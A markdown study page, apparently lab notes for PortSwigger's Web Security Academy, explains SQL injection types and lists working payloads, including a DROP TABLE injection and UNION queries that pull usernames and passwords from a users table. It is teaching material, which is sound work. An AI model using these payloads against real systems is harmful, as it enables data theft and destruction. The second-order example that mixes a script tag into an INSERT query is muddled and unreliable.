# Injection Examples: [Lab-Solutions](https://github.com/IOxCyber/CyberEssentials/blob/f759882896be05d29c88b3d7bc31fc83759afab3/Security-Tools/Burp_Suite/PortSwigger-WebSecAcad/Web_Vuln-Insights/SQL%20Injection/SQLi_Labs.md)

## A. `Retrieving hidden data`, where you can modify a SQL query to return additional results.

### 1. Testing for boolean-based attacks:
- Original Query: `SELECT * FROM products WHERE category = 'Gifts' AND released = 1`
- Modified: ![image](https://github.com/user-attachments/assets/e4236490-1079-4f23-92c9-a4097f63a50c)
- Query to executed by DB after injections: `SELECT * FROM products;`

### Injections:
- `'OR '1'='1` - This payload appends an OR condition that always evaluates to true.
- `'OR 1=1 --` - This payload appends an OR condition that always evaluates to true, commenting out the remaining portion of the original query.
- `'OR 'x'='x` - This payload compares a string with itself, resulting in a true condition.

### 2. Testing for time-based attacks:
- `'OR SLEEP(5) --` - This payload tries to induce a delay of 5 seconds in the SQL query execution by using the SLEEP function. If the website is vulnerable, it will take longer to respond.
- `'OR BENCHMARK(10000000,SHA1(1)) --` - This payload attempts to measure the time taken to execute the SHA1 function a large number of times, causing a significant delay if the SQL injection is successful.

### 3. Testing for error-based attacks:
- `'OR 1=1; DROP TABLE users; --` - This payload combines a valid condition (1=1) with a malicious action (DROP TABLE users), potentially causing an error and deleting the "users" table.
-  `'OR 1=1 UNION ALL SELECT NULL, CONCAT(username,':', password) FROM users --` - This payload attempts to perform a UNION-based SQL injection to retrieve the usernames and passwords from the "users" table.

---
---

## B. `Subverting/interfering with application logic`, change a query to interfere with the application's logic.
- Testing on a login page involves attempting to subvert the application logic and bypass the authentication mechanism
- `SELECT * FROM users WHERE username = 'administrator'--' AND password = ''` commenting out the remaining portion of the original query.

---
---

# UNION Attack

## C. UNION attacks `to combine the result sets of two or more SELECT statements in a single SQL query`

### 1. `Retrieve data from different database tables.`
- eg. `SELECT a, b FROM table1 UNION SELECT c, d FROM table2`

## NOTE: For a Union Query to work: Both queries should `Return same number of Columns, Data type must be compatiable.`

### Example
1. Original Query: `SELECT * FROM users WHERE username = 'input_username' AND password = 'input_password';`

2. Injection: `username ' UNION SELECT null, table_name FROM information_schema.tables --` (-- to comment out rest of the original query)

3. Modified Query: `SELECT * FROM users WHERE username = '' UNION SELECT null, table_name FROM information_schema.tables --' AND password = 'input_password';`

### 2. Determining the number of columns required `No. of columns being returned from the original query` #LAB-4
- Motive: Determine the Columns Numbers > 

- Method 1: `injecting a series of ORDER BY clauses and incrementing` the specified column index until an error occurs.
> `ORDER BY` clause in SQL is used to sort the result set of a query by one or more columns.
```
eg.
SELECT * FROM employees WHERE age > 25 ORDER BY salary DESC;

' ORDER BY 1--    **It means to sort the table by column 1**
' ORDER BY 2--
' ORDER BY 3--
etc.
```
- Method 2: Submitting a series of `UNION SELECT` payloads specifying a different number of null values.
> NULL is convertible to every common data type, so it maximizes the chance that the payload will succeed.
```
eg.

' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
etc.
```

### Finding columns with a useful data type 
- `After we determine the number of returning columns, we can probe each column to test whether it can hold string data.`
- We can submit a series of UNION SELECT payloads that place a string value into each column.
```
eg.

' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```
> If the column data type is not compatible with string data, the injected query will cause a database error.


### Using a SQL injection UNION attack to retrieve interesting data: #LAB-5
- Once, we determined the `number of columns returned` by the original query and found which `columns can hold string data`, you are in a position to retrieve interesting data.
```
eg.

The original query returns two columns, both of which can hold string data.
The injection point is a quoted string within the WHERE clause.
The database contains a table called users with the columns username and password.

In this example, you can retrieve the contents of the `users` table by submitting the input:

' UNION SELECT username, password FROM users--
```
> To perform above attack, we need to know that there is a `table USERS with two columns` called `username and password.`

### Retrieving multiple values within a single column:









---
---

## Blind SQL Injection Testing

## D. Blind SQL injection, `where the results of a query you can't see in the application's responses.`
- Similar to other SQL injection attacks. However, the attacker doesn't see the direct results of their injected queries.
- Trial and error, the attacker continues to extract data by asking a series of true or false questions, gradually revealing sensitive information such as database structure, table names, or even specific data records.

### Test Case 1: Boolean-Based Blind SQL Injection
- Test Steps:
1. Enter a legitimate username and password in the login form.
2. In the username field, append a single quote (`'`) and `AND 1=1--` to inject a condition that is always true.
3. Observe the application's response.

**Expected Outcome**: The login should be successful, indicating a vulnerability to boolean-based blind SQL injection.

### Test Case 2: Time-Based Blind SQL Injection
- Test Steps:
1. Enter a legitimate username and password in the login form.
2. In the username field, append injection `'AND SLEEP(5)--` to introduce a delay of 5 seconds in the query execution.
3. Observe the application's response.

**Expected Outcome**: The login process should exhibit a noticeable delay, indicating a vulnerability to time-based blind SQL injection.

### Test Case 3: Error-Based Blind SQL Injection
- Test Steps:
1. Enter a legitimate username and password in the login form.
2. In the username field, append a single quote (`'`) and `AND 1=0 UNION SELECT 1/0--` to generate a SQL error by dividing by zero.
3. Observe the application's response.

**Expected Outcome**: The application should display an error message, indicating a vulnerability to error-based blind SQL injection.

### E. `Second Order SQLi/stored SQL injection/Persistent SQL Injection: takes user input & stores(in DB) it for future use.`
-  Application takes user input from an HTTP request(Input field) and stores(in DB) it for future use.
-  Later, when handling a different HTTP request, the application retrieves the stored data and incorporates it into a SQL query in an unsafe way.
>  Second-order SQL injection occurs when user-supplied input is stored and later used in a SQL query without proper validation and sanitization. 
-  <img width="500" alt="image" src="https://github.com/cybersome/CyberEssentials/assets/40174034/c90a6116-2d4c-43f1-86a6-c927b2cc9428">

### Examples
1. `User Registration Form`: An attacker could register with a username containing a malicious payload, such as: `Username: ' OR '1'='1'; --`
- Later, when the application retrieves user details using the stored query, it becomes:  `SELECT * FROM users WHERE username = '' OR '1'='1'; --';`
2. `User Comments`: An attacker could submit a comment containing a malicious payload, such as: `Comment: <script>malicious_code();</script>` 
- Later, when the application retrieves and displays the comments using the stored query, it becomes: `INSERT INTO comments (content) VALUES ('<script>malicious_code();</script>');`
